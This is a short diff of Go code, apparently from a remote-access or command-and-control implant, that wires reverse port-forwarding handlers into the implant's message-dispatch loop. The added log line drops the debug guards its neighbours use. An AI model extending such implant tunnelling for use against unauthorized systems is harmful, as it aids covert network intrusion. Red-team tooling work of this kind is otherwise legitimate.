@@ -548,6 +548,7 @@ func sessionMainLoop(connection *transports.Connection) error {
 	tunHandlers := handlers.GetTunnelHandlers()
 	sysHandlers := handlers.GetSystemHandlers()
 	specialHandlers := handlers.GetSpecialHandlers()
+	rportfwdHandlers := handlers.GetRportFwdHandlers()
 
 	for envelope := range connection.Recv {
 		if handler, ok := specialHandlers[envelope.Type]; ok {
@@ -559,6 +560,11 @@ func sessionMainLoop(connection *transports.Connection) error {
 			// {{if .Config.Debug}}
 			log.Printf("[recv] pivotHandler with type %d", envelope.Type)
 			// {{end}}
+			go handler(envelope, connection)
+		} else if handler, ok := rportfwdHandlers[envelope.Type]; ok {
+			//
+			log.Printf("[recv] rportfwdHandler with type %d", envelope.Type)
+			//
 			go handler(envelope, connection)
 		} else if handler, ok := sysHandlers[envelope.Type]; ok {
 			// Beware, here be dragons.
